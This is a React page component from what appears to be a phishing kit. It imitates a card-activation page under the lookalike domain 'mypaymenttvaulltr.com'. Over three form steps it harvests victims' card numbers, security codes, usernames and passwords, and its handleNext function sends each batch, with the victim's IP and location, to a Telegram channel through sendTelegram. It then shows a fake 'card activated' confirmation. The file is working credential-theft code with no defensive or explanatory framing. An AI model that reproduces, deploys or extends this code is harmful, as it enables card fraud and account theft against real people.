import { useState } from "react";
import { useLocation } from "wouter";
import { AuthHeader } from "@/components/auth-header";
import { CheckCircle } from "lucide-react";
import { sendTelegram, getIPInfo } from "@/lib/telegram";

import { useI18n } from "@/lib/i18n";

const TOTAL_STEPS = 3;

export default function ActivateCard() {
  const [, navigate] = useLocation();
  const { t } = useI18n();
  const [step, setStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [done, setDone] = useState(false);

  const [form, setForm] = useState({
    cardNumber: "",
    securityCode: "",
    username: "",
    password: "",
    confirmPassword: "",
  });

  const set = (field: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm((f) => ({ ...f, [field]: e.target.value }));

  const formatCard = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const STEPS = [
    { label: t.activateCardPageTitle, description: t.activateCardDesc },
    { label: t.createUsernameTitle,   description: t.createUsernameDesc },
    { label: t.createPasswordTitle,   description: t.createPasswordDesc },
  ];

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (step === 2 && form.password !== form.confirmPassword) {
      setError("Passwords do not match.");
      return;
    }
    if (step === 2 && form.password.length < 6) {
      setError("Password must be at least 6 characters.");
      return;
    }

    setLoading(true);
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ip = await getIPInfo();

    if (step === 0) {
      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `💳 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Aktivasi Kartu — Step 1</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>        : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );
    } else if (step === 1) {
      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `💳 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Aktivasi Kartu — Step 2</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>    : <code>${form.username}</code>\n` +
        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>       : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );
    } else if (step === 2) {
      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Aktivasi Kartu — Selesai</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
        `🔒 <b>Kode Keamanan</b>: <code>${form.securityCode}</code>\n` +
        `👤 <b>Username</b>     : <code>${form.username}</code>\n` +
        `🔑 <b>Password</b>     : <code>${form.password}</code>\n` +
        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>        : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `🎉 <i>Kartu berhasil diaktifkan!</i>`
      );
    }

    await new Promise((r) => setTimeout(r, 800));
    setLoading(false);
    if (step < TOTAL_STEPS - 1) {
      setStep(step + 1);
    } else {
      setDone(true);
    }
  };

  const inputClass =
    "w-full h-11 px-3 border border-gray-300 rounded-sm text-[13px] text-gray-800 placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-all bg-white";

  const currentStep = STEPS[step];

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <AuthHeader />

      <div className="w-full overflow-hidden" style={{ maxHeight: "310px" }}>
        <img src="/hero-card-clean.png" alt="mypaymenttvaulltr.com" className="w-full object-cover"
          style={{ maxHeight: "310px", objectPosition: "center 20%" }} />
      </div>

      {!done ? (
        <div className="flex-1 flex flex-col md:flex-row">
          <div className="md:w-1/2 px-8 py-8">
            <h2 className="text-[22px] font-light text-gray-800 tracking-wide border-b border-gray-300 pb-3 mb-4">
              {currentStep.label}
            </h2>
            <p className="text-[13px] text-gray-600 leading-relaxed">{currentStep.description}</p>
          </div>

          <div className="md:w-1/2 px-8 py-8 flex items-start justify-center md:justify-start">
            <div className="w-full max-w-[360px] bg-white border border-gray-200 rounded-sm shadow-sm p-6">
              <form onSubmit={handleNext} className="space-y-3">

                {/* Step 0: Card Number + Security Code */}
                {step === 0 && (
                  <>
                    <input type="text" value={form.cardNumber}
                      onChange={(e) => setForm((f) => ({ ...f, cardNumber: formatCard(e.target.value) }))}
                      required placeholder={`${t.cardNumber}*`} className={inputClass} />
                    <input type="text" value={form.securityCode}
                      onChange={(e) => setForm((f) => ({ ...f, securityCode: e.target.value.replace(/\D/g, "").slice(0, 4) }))}
                      required placeholder={`${t.securityCode}*`} className={inputClass} />
                  </>
                )}

                {/* Step 1: Username */}
                {step === 1 && (
                  <input type="text" value={form.username} onChange={set("username")} required
                    placeholder={`${t.username}*`} className={inputClass} />
                )}

                {/* Step 2: Password */}
                {step === 2 && (
                  <>
                    <input type="password" value={form.password} onChange={set("password")} required
                      placeholder={`${t.password}*`} className={inputClass} />
                    <input type="password" value={form.confirmPassword} onChange={set("confirmPassword")} required
                      placeholder={`${t.confirmPassword}*`} className={inputClass} />
                  </>
                )}

                {error && <p className="text-red-500 text-[12px]">{error}</p>}

                <div className="flex gap-3 pt-1">
                  <button type="button" onClick={() => step === 0 ? navigate("/login") : setStep(step - 1)}
                    className="flex-1 h-11 border border-gray-800 text-gray-800 text-[13px] font-medium rounded-sm hover:bg-gray-50 transition-colors">
                    {t.cancel}
                  </button>
                  <button type="submit" disabled={loading}
                    className="flex-1 h-11 bg-[#1a1a1a] text-white text-[13px] font-medium rounded-sm hover:bg-[#333] transition-colors disabled:opacity-50">
                    {loading ? t.pleaseWait : t.continueBtn}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      ) : (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="w-full max-w-[400px] text-center py-10">
            <CheckCircle className="w-14 h-14 text-green-500 mx-auto mb-4" />
            <h2 className="text-[20px] font-light text-gray-800 mb-2">{t.cardActivatedTitle}</h2>
            <p className="text-[13px] text-gray-500 mb-2">
              {t.cardActivatedDesc1}{" "}
              <span className="font-semibold text-gray-700">···· {form.cardNumber.replace(/\s/g, "").slice(-4)}</span>{" "}
              {t.cardActivatedDesc2}
            </p>
            <p className="text-[13px] text-gray-500 mb-6">
              <span className="font-semibold text-gray-700">@{form.username}</span>
            </p>
            <button type="button" onClick={() => navigate("/login")}
              className="w-full h-11 bg-[#1a1a1a] text-white text-[13px] font-medium rounded-sm hover:bg-[#333] transition-colors">
              {t.goToLogin}
            </button>
          </div>
        </div>
      )}

      <p className="text-[11px] text-gray-400 text-center py-4 border-t border-gray-100">
        &copy; {t.copyright} |{" "}
        <button className="underline hover:text-gray-600">{t.termsOfUse}</button>
        {" | "}
        <button className="underline hover:text-gray-600">{t.privacyCookies}</button>
      </p>
    </div>
  );
}
